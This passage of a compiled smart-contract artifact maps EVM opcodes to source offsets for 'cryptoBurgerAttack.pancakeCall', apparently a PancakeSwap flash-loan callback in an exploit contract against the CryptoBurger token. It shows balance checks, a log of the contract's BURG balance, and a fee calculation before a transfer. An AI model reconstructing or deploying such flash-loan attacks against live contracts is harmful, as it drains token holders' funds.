      "op": "AND",
      "path": "0"
    },
    "9023": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11442
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9024": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11452
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "9029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11452
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9030": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "9032": {
      "op": "ADD"
    },
    "9033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "9035": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9037": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9038": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9039": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9040": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "SUB",
      "path": "0"
    },
    "9041": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP7",
      "path": "0"
    },
    "9043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "GAS",
      "path": "0"
    },
    "9044": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "9045": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9046": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9047": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9048": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2365"
    },
    "9051": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "9052": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9053": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9055": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9056": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "9057": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9058": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9060": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "REVERT",
      "path": "0"
    },
    "9061": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9062": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "POP",
      "path": "0"
    },
    "9063": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "POP",
      "path": "0"
    },
    "9064": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "POP",
      "path": "0"
    },
    "9065": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "POP",
      "path": "0"
    },
    "9066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9068": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9069": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9070": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "NOT",
      "path": "0"
    },
    "9073": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9075": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9076": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ADD",
      "path": "0"
    },
    "9077": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "AND",
      "path": "0"
    },
    "9078": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9079": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ADD",
      "path": "0"
    },
    "9080": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9081": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9083": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9084": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "POP",
      "path": "0"
    },
    "9085": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9086": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "ADD",
      "path": "0"
    },
    "9087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9088": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2389"
    },
    "9091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9093": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "9096": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11426,
        11467
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9097": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11426,
        11467
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9098": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11481,
        11482
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9100": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11512,
        11516
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "9101": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11368,
        11374
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "9104": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11368,
        11528
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9105": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11368,
        11528
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9106": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11628
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 91,
      "value": "0x1"
    },
    "9108": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11628
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "9109": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9111": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9112": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "9117": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "9119": {
      "op": "SHL"
    },
    "9120": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9121": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9122": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11647,
        11651
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "9123": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "9125": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9126": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ADD",
      "path": "0"
    },
    "9127": {
      "op": "MSTORE"
    },
    "9128": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "9130": {
      "op": "DUP1"
    },
    "9131": {
      "op": "MLOAD"
    },
    "9132": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9134": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "9137": {
      "op": "DUP4"
    },
    "9138": {
      "op": "CODECOPY"
    },
    "9139": {
      "op": "DUP2"
    },
    "9140": {
      "op": "MLOAD"
    },
    "9141": {
      "op": "SWAP2"
    },
    "9142": {
      "op": "MSTORE"
    },
    "9143": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9144": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9146": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "9148": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9150": {
      "op": "SHL"
    },
    "9151": {
      "op": "SUB"
    },
    "9152": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11628
      ],
      "op": "AND",
      "path": "0"
    },
    "9153": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11628
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9154": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11638
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "9159": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11638
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9160": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "9162": {
      "op": "ADD"
    },
    "9163": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "9165": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9167": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9169": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP4",
      "path": "0"
    },
    "9170": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "SUB",
      "path": "0"
    },
    "9171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9172": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP7",
      "path": "0"
    },
    "9173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "GAS",
      "path": "0"
    },
    "9174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "9175": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9176": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9177": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "9178": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x23E7"
    },
    "9181": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "9182": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9183": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9185": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9186": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "9187": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9188": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9190": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "REVERT",
      "path": "0"
    },
    "9191": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9192": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "POP",
      "path": "0"
    },
    "9193": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "POP",
      "path": "0"
    },
    "9194": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "POP",
      "path": "0"
    },
    "9195": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "POP",
      "path": "0"
    },
    "9196": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9198": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9199": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "9200": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "NOT",
      "path": "0"
    },
    "9203": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "9205": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9206": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ADD",
      "path": "0"
    },
    "9207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "AND",
      "path": "0"
    },
    "9208": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9209": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ADD",
      "path": "0"
    },
    "9210": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9211": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "9214": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "POP",
      "path": "0"
    },
    "9215": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9216": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "ADD",
      "path": "0"
    },
    "9217": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9218": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x240B"
    },
    "9221": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "9226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11612,
        11653
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9227": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11612,
        11653
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9228": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x245E"
    },
    "9234": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9235": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9236": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "9238": {
      "op": "DUP1"
    },
    "9239": {
      "op": "DUP3"
    },
    "9240": {
      "op": "MSTORE"
    },
    "9241": {
      "op": "PUSH1",
      "value": "0x23"
    },
    "9243": {
      "op": "SWAP1"
    },
    "9244": {
      "op": "DUP3"
    },
    "9245": {
      "op": "ADD"
    },
    "9246": {
      "op": "MSTORE"
    },
    "9247": {
      "op": "PUSH32",
      "value": "0x425552472062616C616E6365206F6620636F6E74726163742061667465722073"
    },
    "9280": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "9282": {
      "op": "DUP3"
    },
    "9283": {
      "op": "ADD"
    },
    "9284": {
      "op": "MSTORE"
    },
    "9285": {
      "op": "PUSH3",
      "value": "0x77617"
    },
    "9289": {
      "op": "PUSH1",
      "value": "0xEC"
    },
    "9291": {
      "op": "SHL"
    },
    "9292": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "9294": {
      "op": "DUP3"
    },
    "9295": {
      "op": "ADD"
    },
    "9296": {
      "op": "MSTORE"
    },
    "9297": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "9299": {
      "op": "DUP2"
    },
    "9300": {
      "op": "ADD"
    },
    "9301": {
      "op": "SWAP2"
    },
    "9302": {
      "op": "SWAP1"
    },
    "9303": {
      "op": "SWAP2"
    },
    "9304": {
      "op": "MSTORE"
    },
    "9305": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "9307": {
      "op": "ADD"
    },
    "9308": {
      "op": "SWAP1"
    },
    "9309": {
      "op": "JUMP"
    },
    "9310": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9311": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "9313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9314": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "DUP1",
      "path": "0"
    },
    "9315": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9316": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SUB",
      "path": "0"
    },
    "9317": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9318": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11544,
        11663
      ],
      "op": "LOG1",
      "path": "0"
    },
    "9319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11706,
        11717
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9321": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11736,
        11739
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3E5"
    },
    "9324": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11722,
        11732
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2476"
    },
    "9327": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11722,
        11728
      ],
      "op": "DUP7",
      "path": "0"
    },
    "9328": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11731,
        11732
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x3"
    },
    "9330": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11722,
        11732
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E53"
    },
    "9333": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11722,
        11732
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9334": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11722,
        11732
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9335": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11721,
        11739
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2480"
    },
    "9338": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11721,
        11739
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "9339": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11721,
        11739
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9340": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11721,
        11739
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E72"
    },
    "9343": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11721,
        11739
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9344": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11721,
        11739
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9345": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11720,
        11744
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x248B"
    },
    "9348": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11720,
        11744
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9349": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11743,
        11744
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1"
    },
    "9351": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11720,
        11744
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E94"
    },
    "9354": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11720,
        11744
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9355": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11720,
        11744
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9356": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11706,
        11744
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "9357": {
      "op": "POP"
    },
    "9358": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11754,
        11775
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "9360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11778,
        11790
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2499"
    },
    "9363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11706,
        11744
      ],
      "op": "DUP3",
      "path": "0"
    },
    "9364": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11778,
        11784
      ],
      "op": "DUP8",
      "path": "0"
    },
    "9365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11778,
        11790
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E94"
    },
    "9368": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        11778,
        11790
      ],
      "op": "JUMP",
      "path": "0"
    },
    "9369": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11778,
        11790
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "9370": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 92,
      "value": "0x40"
    },
    "9372": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "9373": {
      "op": "PUSH4",
      "value": "0xA9059CBB"
    },
    "9378": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "9380": {
      "op": "SHL"
    },
    "9381": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
      "op": "DUP2",
      "path": "0"
    },
    "9382": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        11801,
        11850
      ],
